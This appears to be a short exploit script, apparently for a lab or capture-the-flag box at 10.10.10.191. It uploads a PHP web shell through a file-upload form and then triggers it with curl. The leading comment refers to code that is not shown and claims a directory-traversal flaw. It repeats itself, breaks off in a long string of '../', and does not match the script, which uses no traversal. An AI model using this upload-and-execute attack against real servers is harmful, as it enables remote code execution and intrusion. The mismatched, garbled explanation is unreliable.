
#
#The code above is a simple web application that allows users to upload files to the server. The code above is vulnerable to a directory traversal attack. The code above is vulnerable to a directory traversal attack because the code does not check the file name of the file that is being uploaded. This means that an attacker can upload a file with a name like ../../../../../../../../../../../../../../../../../../../../../../../

import requests
import os

url = "http://10.10.10.191/upload/"

files = {'file': open('shell.php', 'rb')}

data = {
    'Upload': 'Upload'
}

r = requests.post(url, files=files, data=data)

print(r.text)

os.system("curl http://10.10.10.191/uploads/shell.php")